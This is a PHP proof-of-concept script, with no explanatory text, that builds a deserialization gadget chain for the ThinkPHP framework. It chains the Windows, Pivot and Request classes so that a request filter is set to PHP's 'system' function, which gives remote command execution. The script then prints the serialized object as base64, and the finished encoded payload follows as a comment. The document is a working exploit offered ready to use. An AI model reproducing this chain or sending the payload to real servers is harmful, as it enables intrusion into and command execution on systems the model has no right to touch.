<?php
namespace think\process\pipes{

    use think\model\Pivot;

    class Windows
    {
        private $files = [];
        public function __construct(){
            $this->files[]=new Pivot();
        }
    }
}
namespace think{
    abstract class Model
    {
        protected $append = [];
        private $data = [];
        public function __construct(){
            $this->data=array(
              'feng'=>new Request()
            );
            $this->append=array(
                'feng'=>array(
                    'hello'=>'world'
                )
            );
        }
    }
}
namespace think\model{

    use think\Model;

    class Pivot extends Model
    {

    }
}
namespace think{
    class Request
    {
        protected $hook = [];
        protected $filter;
        protected $config = [
            // 表单请求类型伪装变量
            'var_method'       => '_method',
            // 表单ajax伪装变量
            'var_ajax'         => '',
            // 表单pjax伪装变量
            'var_pjax'         => '_pjax',
            // PATHINFO变量名 用于兼容模式
            'var_pathinfo'     => 's',
            // 兼容PATH_INFO获取
            'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
            // 默认全局过滤方法 用逗号分隔多个
            'default_filter'   => '',
            // 域名根，如thinkphp.cn
            'url_domain_root'  => '',
            // HTTPS代理标识
            'https_agent_name' => '',
            // IP代理获取标识
            'http_agent_ip'    => 'HTTP_X_REAL_IP',
            // URL伪静态后缀
            'url_html_suffix'  => 'html',
        ];
        public function __construct(){
            $this->hook['visible']=[$this,'isAjax'];
            $this->filter="system";
        }
    }
}
namespace{

    use think\process\pipes\Windows;

    echo base64_encode(serialize(new Windows()));
}
#TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJmZW5nIjthOjE6e3M6NToiaGVsbG8iO3M6NToid29ybGQiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJmZW5nIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjg7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTA6e3M6MTA6InZhcl9tZXRob2QiO3M6NzoiX21ldGhvZCI7czo4OiJ2YXJfYWpheCI7czowOiIiO3M6ODoidmFyX3BqYXgiO3M6NToiX3BqYXgiO3M6MTI6InZhcl9wYXRoaW5mbyI7czoxOiJzIjtzOjE0OiJwYXRoaW5mb19mZXRjaCI7YTozOntpOjA7czoxNDoiT1JJR19QQVRIX0lORk8iO2k6MTtzOjE4OiJSRURJUkVDVF9QQVRIX0lORk8iO2k6MjtzOjEyOiJSRURJUkVDVF9VUkwiO31zOjE0OiJkZWZhdWx0X2ZpbHRlciI7czowOiIiO3M6MTU6InVybF9kb21haW5fcm9vdCI7czowOiIiO3M6MTY6Imh0dHBzX2FnZW50X25hbWUiO3M6MDoiIjtzOjEzOiJodHRwX2FnZW50X2lwIjtzOjE0OiJIVFRQX1hfUkVBTF9JUCI7czoxNToidXJsX2h0bWxfc3VmZml4IjtzOjQ6Imh0bWwiO319fX19fQ==

